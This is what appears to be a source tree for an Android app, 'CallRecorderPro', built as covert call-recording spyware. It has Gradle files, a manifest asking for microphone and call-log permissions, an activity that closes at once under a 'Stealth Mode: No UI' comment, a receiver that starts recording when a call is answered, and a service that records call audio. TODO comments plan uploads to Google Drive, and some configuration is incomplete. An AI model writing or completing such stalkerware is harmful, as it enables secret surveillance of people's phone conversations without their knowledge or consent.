// CallRecorderPro/build.gradle
buildscript {
    ext {
        kotlin_version = '1.8.22'
    }
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath "com.android.tools.build:gradle:8.1.1"
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
        classpath 'com.google.gms:google-services:4.3.15'
    }
}// CallRecorderPro/app/build.gradle
plugins {
    id 'com.android.application'
    id 'kotlin-android'
    id 'com.google.gms.google-services'
}

android {
    namespace "com.example.callrecorderpro"
    compileSdk 34

    defaultConfig {
        applicationId "com.example.callrecorderpro"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"

        permissions {
            // Phone, Call logs, Microphone, Internet
        }
    }

    buildTypes {
        release {
            minifyEnabled false
        }
    }
}

dependencies {
    implementation "org.jetbrains.kotlin:kotlin-stdlib:1.8.22"
    implementation 'com.google.android.gms:play-services-auth:20.7.0'
    implementation 'com.google.api-client:google-api-client:1.34.0'
    implementation 'com.google.api-client:google-api-client-android:1.34.0'
    implementation 'com.google.apis:google-api-services-drive:v3-rev197-1.25.0'
}<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.callrecorderpro">

    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.INTERNET"/>

    <application
        android:allowBackup="true"
        android:label="CallRecorderPro"
        android:icon="@mipmap/ic_launcher"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        
        <service android:name=".CallRecorderService"
                 android:foregroundServiceType="microphone|phoneCall"
                 android:exported="false"/>
        
        <receiver android:name=".CallReceiver"
                  android:enabled="true"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
            </intent-filter>
        </receiver>

        <activity android:name=".MainActivity"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
package com.example.callrecorderpro

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Stealth Mode: No UI, auto close
        finish()
    }
}package com.example.callrecorderpro

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager

class CallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
            // Start recording service
            context.startService(Intent(context, CallRecorderService::class.java))
        } else if (state == TelephonyManager.EXTRA_STATE_IDLE) {
            // Stop service when call ends
            context.stopService(Intent(context, CallRecorderService::class.java))
        }
    }
}package com.example.callrecorderpro

import android.app.Service
import android.content.Intent
import android.media.MediaRecorder
import android.os.IBinder

class CallRecorderService : Service() {
    private var recorder: MediaRecorder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startRecording()
        return START_NOT_STICKY
    }

    private fun startRecording() {
        recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

            // Stealth mode: No local storage, (TODO: directly stream to Drive API)
            setOutputFile(filesDir.absolutePath + "/temp_recording.mp4")

            prepare()
            start()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        recorder?.stop()
        recorder?.release()
        recorder = null

        // TODO: Upload temp_recording.mp4 to Google Drive
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
